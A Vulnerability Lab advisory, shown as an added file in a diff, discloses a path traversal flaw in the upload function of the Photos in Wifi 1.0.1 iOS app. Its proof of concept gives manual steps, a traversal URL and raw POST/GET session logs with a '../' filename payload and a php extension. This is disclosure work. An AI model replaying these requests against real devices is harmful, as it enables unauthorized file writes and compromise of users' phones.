@@ -1,0 +1,167 @@
+Document Title:
+===============
+Photos in Wifi 1.0.1 iOS - Path Traversal Web Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1600
+
+
+Release Date:
+=============
+2018-01-04
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1600
+
+
+Common Vulnerability Scoring System:
+====================================
+6.5
+
+
+Vulnerability Class:
+====================
+Directory- or Path-Traversal
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Share the photos and videos of your iPhone/iPad in wifi. Upload photos and videos right to your camera roll without iTunes.
+With Photos In Wifi, you can share your whole camera roll, and album, or a selection of photos and videos. Once the app 
+server is started, you can view, play and download the shared photos and videos from any computer or smartphone web browser. 
+You can also upload a photo, a video, or a zip file containing 100`s of photos and videos, right into your iPhone/iPad 
+camera roll. You can also use Photos In Wifi to send multiples full resolution photos and videos in a single email or MMS.
+
+(Copy of the Homepage: https://itunes.apple.com/us/app/photos-in-wifi-share-photos/id966316576 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Core Research Team discovered a path traversal web vulnerability in the Photos in Wifi v1.0.1 iOS mobile web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2018-01-04: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Sebastien BUET
+Product: Photos In Wifi - iOS Mobile (Web-Application) 1.0.1
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+An directory traversal web vulnerability has been discovered in the official Photos in Wifi v1.0.1 iOS mobile web-application.
+The vulnerability allows remote attackers to unauthorized access other the mobile application folders to compromise 
+by an upload of malicious contents.
+
+The vulnerability is located in `Select a photo or a video to upload` module. Remote attackers are able to intercept the vulnerable 
+filename value in the upload - submit POST method request to compromise the mobile app. The encoding of the ext value and the parse 
+of the filename value is broken which results obviously in this unexpected behavior. The injection point of the issue is the upload 
+POST method request with the vulnerable filename value. The execution point occurs in the assets.php file when processing to display 
+the images or videos.
+
+The security risk of the path traversal vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.5. 
+Exploitation of the remote web vulnerability requires no user interaction and also no privileged web application user account.
+Successful exploitation of the file upload vulnerability results in web-server, web module, website or dbms compromise.
+
+Vulnerable Module(s):
+[+] ./assets-library://asset/
+
+Vulnerable File(s):
+[+] asset.php
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability can be exploited by remote attackers without privileged web-application user account or user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Start the web-server (wifi)
+2. Go to another computer and login by requesting via http localhost
+3. Click upload and choose a random file
+4. Start a live session tamper for http
+5. Submit the upload to continue with the POST method request
+6. Inject to the filename value with a payload and path as extension 
+7. Continue to reply the request
+8. The server responds with 200OK
+9. Open the poc url of the path to execute the malicious content to compromise
+10. Successful reproduce of the vulnerability!
+
+
+PoC: URL
+http://localhost/assets-library://asset/asset.php?id=40C9C332-857B-4CB8-B848-59A30AA9CF3B&ext=[../not_allowed_directory/].[ext]
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://localhost/ 
+Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+   POST-Daten:
+      POST_DATA[-----------------------------191201034430987
+Content-Disposition: form-data; name="file"; filename="../not_allowed_directory/newfile.[ext]"
+-
+Status: 200[OK] 
+GET http://localhost/assets-library://asset/asset.php?id=250D47DB-57DD-47E4-B72A-CD4455B06277&ext=php 
+Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[0]
+
+
+Security Risk:
+==============
+The security risk of the web vulnerability in the wifi interface upload post method request is estimated as high (CVSS 6.5).
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.)
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
+implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
+case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
+suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
+or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
+websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
+or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
+phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.
